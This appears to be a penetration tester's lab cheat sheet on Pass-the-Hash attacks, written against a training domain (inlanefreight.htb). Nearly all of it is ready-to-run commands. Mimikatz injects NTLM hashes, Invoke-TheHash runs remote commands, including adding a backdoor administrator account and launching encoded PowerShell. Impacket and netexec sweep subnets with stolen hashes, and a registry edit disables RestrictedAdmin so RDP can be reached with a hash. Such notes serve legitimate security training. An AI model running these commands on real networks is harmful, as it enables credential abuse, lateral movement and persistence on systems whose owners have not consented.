- [ ] PTH From Windows
- [ ] Windows UAC limits Pass the Hash for local accounts
- [ ] PTH From Linux

PTH From Windows!!!
```powershell
# mimikatz
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
# Invoke TheHash
https://github.com/Kevin-Robertson/Invoke-TheHash

Invoke-WMIExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash

Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command "powershell -e JABjAGwAaQBlA"

Invoke-SMBClient -Domain inlanefreight.htb -Username david -Hash c39f2beb3d2ec06a62cb887fb391dee0 -Source \\dc01\david

Invoke-SMBClient -Domain inlanefreight.htb -Username david -Hash c39f2beb3d2ec06a62cb887fb391dee0 -Action Get -Source \\dc01\david\david.txt

Invoke-TheHash -Type SMBExec -Target 172.16.1.10 -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b
```
Windows UAC limits Pass the Hash for local accounts!!!
![[Pasted image 20251109070029.png]]
```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy
- 0: only the builtin administrator (RID 500) is allowed to perform remote administrative tasks, local admins are not allowed to
```
PTH From Linux!!!
```sh
# impacket
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

impacket-getTGT -hashes ':c39f2beb3d2ec06a62cb887fb391dee0' inlanefreight.htb/david

impacket-wmiexec, impacket-atexec, impacket-smbexec, getTGT

# netexec
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
# evil-winrm
evil-winrm -i IP -u Administrator -H 30B3783CE2AB***
# rdp
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'

xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B

rdesktop -u administrator -p 30B3783CE2ABF1AF70F77D0660CF3453 10.129.95.46
```